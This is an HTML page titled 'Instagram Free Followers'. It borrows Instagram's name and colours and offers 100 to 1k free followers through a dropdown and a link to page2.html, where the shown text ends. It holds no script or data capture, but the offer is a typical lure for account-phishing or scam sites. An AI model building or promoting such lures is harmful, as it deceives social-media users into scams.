<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Free Followers</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f5f5f5; /* Background color */
      color: #333; /* Text color */
    }

    header {
      background-color: #405de6; /* Header background color */
      padding: 20px;
      text-align: center;
      color: #ffffff; /* Header text color */
    }

    main {
      text-align: center;
      padding: 20px;
    }

    p {
      font-size: 20px;
      color: #0095f6; /* Primary color */
      margin-bottom: 20px;
    }

    nav {
      display: flex;
      justify-content: center;
      padding: 10px;
      border-top: 1px solid #dbdbdb;
      border-bottom: 1px solid #dbdbdb;
      margin-bottom: 20px;
    }

    nav select {
      padding: 10px;
      font-size: 16px;
      border: none;
      background-color: #ffffff; /* Dropdown background color */
      color: #333; /* Dropdown text color */
      cursor: pointer;
      margin-left: 10px;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    nav select:hover {
      background-color: #e6e6e6; /* Dropdown hover color */
    }

    button {
      background-color: #0095f6; /* Button color */
      color: #ffffff; /* Button text color */
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #007bb5; /* Button hover color */
    }

    .icons {
      display: flex;
      justify-content: center;
      margin-top: 20px;
    }

    .icons i {
      font-size: 30px;
      color: #333; /* Icon color */
      margin: 0 10px;
      transition: transform 0.3s ease;
    }

    .icons i:hover {
      transform: scale(1.2); /* Icon scale on hover */
    }

    footer {
      background-color: #333; /* Footer background color */
      color: #ffffff; /* Footer text color */
      text-align: center;
      padding: 10px;
      position: fixed;
      bottom: 0;
      width: 100%;
    }
  </style>
</head>
<body>

  <header>
    <h1>Instagram Free Followers</h1>
  </header>

  <main>
    <p>Boost your Instagram presence with free followers!</p>

    <nav>
      <select>
        <option value="100">100 Followers</option>
        <option value="500">500 Followers</option>
        <option value="1k">1k Followers</option>
      </select>
   </nav>
<a href="page2.html">
